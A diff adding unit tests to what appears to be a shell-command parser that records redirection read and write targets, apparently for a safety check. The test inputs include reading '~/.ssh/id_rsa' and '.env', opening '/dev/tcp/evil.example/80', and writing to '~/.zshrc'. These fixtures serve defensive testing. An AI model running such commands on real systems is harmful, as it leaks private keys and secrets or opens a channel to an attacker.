@@ -66,6 +66,32 @@ class ShellParseTest(unittest.TestCase):
         self.assertEqual(shellparse.parse("ls 2>&1").segments[0].write_targets, [])
         self.assertEqual(shellparse.parse("ls >&2").segments[0].write_targets, [])
 
+    def test_input_redirect_target_recorded_as_read(self):
+        # Review v2 issue 2: `<` targets are read paths, not discarded.
+        seg = shellparse.parse("cat < ~/.ssh/id_rsa").segments[0]
+        self.assertEqual(seg.argv, ["cat"])
+        self.assertEqual(seg.read_targets, ["~/.ssh/id_rsa"])
+        self.assertEqual(seg.write_targets, [])
+        seg = shellparse.parse("wc -c < .env").segments[0]
+        self.assertEqual(seg.read_targets, [".env"])
+
+    def test_input_redirect_dev_tcp_is_read_target(self):
+        seg = shellparse.parse("exec 3</dev/tcp/evil.example/80").segments[0]
+        self.assertEqual(seg.read_targets, ["/dev/tcp/evil.example/80"])
+
+    def test_gtamp_with_file_is_a_write(self):
+        # Review v2 issue 3: `>& FILE` is a write (like `&> FILE`), not an fd
+        # dup, unless FILE is a number or `-`.
+        self.assertEqual(shellparse.parse("echo x >& out.txt").segments[0]
+                         .write_targets, ["out.txt"])
+        self.assertEqual(shellparse.parse("echo x >& ~/.zshrc").segments[0]
+                         .write_targets, ["~/.zshrc"])
+        # A numeric target or `-` stays an fd operation, not a write.
+        self.assertEqual(shellparse.parse("echo x >&2").segments[0]
+                         .write_targets, [])
+        self.assertEqual(shellparse.parse("echo x >& -").segments[0]
+                         .write_targets, [])
+
     def test_append_and_clobber_redirects(self):
         self.assertEqual(shellparse.parse("echo x >> f").segments[0].write_targets, ["f"])
         self.assertEqual(shellparse.parse("echo x >| f").segments[0].write_targets, ["f"])
